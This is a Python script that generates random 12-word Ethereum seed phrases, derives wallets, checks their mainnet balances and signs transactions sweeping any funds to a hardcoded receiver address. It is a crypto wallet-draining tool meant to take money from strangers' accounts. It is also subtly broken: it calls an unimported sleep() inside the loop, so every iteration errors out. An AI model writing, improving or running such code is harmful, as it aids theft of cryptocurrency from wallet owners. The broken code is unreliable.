from web3 import Web3
from mnemonic import Mnemonic
from eth_account import Account
import time

# Connect to Ethereum mainnet via public node
node_url = 'https://rpc.ankr.com/eth'  # Public mainnet node
web3 = Web3(Web3.HTTPProvider(node_url))

Account.enable_unaudited_hdwallet_features()

if not web3.is_connected():
    raise Exception("Failed to connect to Ethereum mainnet")
print("Connected to Ethereum mainnet")

# Receiver address
receiver_address = '0x64669F88Fd2cE75A2448C7F41B78e0bb6b79ce19'

# Transaction parameters
gas_limit = 21000
gas_price = web3.to_wei('20', 'gwei')  # Adjust based on mainnet network
chain_id = 1  # Ethereum mainnet

total_transferred = 0
mnemo = Mnemonic("english")

# Generate 1000 random 12-word mnemonic phrases
mnemonic_phrases = [mnemo.generate(strength=128) for _ in range(1000)]

for idx, mnemonic_phrase in enumerate(mnemonic_phrases, 1):
    try:
        # Generate account
        sleep(0.5)
        acct = Account.from_mnemonic(mnemonic_phrase)
        sender_address = acct.address
        private_key = acct.key if hasattr(acct, 'key') else acct.privateKey

        print(f"[{idx}] Sender: {sender_address}")

        # Fetch balance safely
        try:
            balance = web3.eth.get_balance(sender_address)
        except Exception as e:
            print(f"[{idx}] Cannot get balance (skipped): {e}")
            continue

        print(f"[{idx}] Balance: {web3.from_wei(balance, 'ether')} ETH")

        transaction_fee = gas_limit * gas_price

        # Skip addresses with insufficient funds
        if balance <= transaction_fee:
            print(f"[{idx}] Insufficient funds. Skipping")
            continue

        amount_to_send = balance - transaction_fee
        nonce = web3.eth.get_transaction_count(sender_address)

        # Create transaction
        tx = {
            'nonce': nonce,
            'to': receiver_address,
            'value': amount_to_send,
            'gas': gas_limit,
            'gasPrice': gas_price,
            'chainId': chain_id
        }

        # Sign and send transaction
        signed_tx = web3.eth.account.sign_transaction(tx, private_key)
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        total_transferred += amount_to_send

        print(f"[{idx}] Transaction sent: {tx_hash.hex()}")

        # Throttle requests to avoid overloading the public node
        time.sleep(0.1)  # 100ms delay

    except Exception as e:
        print(f"[{idx}] General error: {e}")

print(f"Total transferred: {web3.from_wei(total_transferred, 'ether')} ETH")
